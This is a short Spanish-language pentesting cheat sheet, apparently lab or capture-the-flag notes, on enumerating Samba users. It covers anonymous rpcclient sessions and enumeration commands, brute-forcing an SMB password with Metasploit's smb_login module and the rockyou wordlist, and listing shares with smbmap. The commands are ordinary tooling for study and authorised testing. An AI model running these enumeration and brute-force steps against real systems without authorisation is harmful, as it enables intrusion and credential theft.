# Usuarios SAMBA y Uso de RPCClient

RPCClient permite enumerar usuarios del sistema a traves del puerto 135 o 445.

## Conexion Anonima

```bash
rpcclient -U "" -N <IP_objetivo>
```

## Comandos Utiles dentro de RPCClient

```bash
srvinfo          # Informacion del servidor
querydispinfo    # Informacion de usuarios
enumdomusers     # Listar usuarios del dominio
```

## Fuerza Bruta con Credenciales SMB

Una vez obtenido un nombre de usuario, se fuerza la contraseña:

```bash
msfconsole

use auxiliary/scanner/smb/smb_login
show options
set RHOSTS <IP_objetivo>
set PASS_FILE /usr/share/wordlists/rockyou.txt
set VERBOSE false
set SMBUser <usuario>
run
```

## Enumeracion con smbmap

```bash
smbmap -H <IP_objetivo> -u 'usuario' -p 'contraseña' -r <directorio>
```
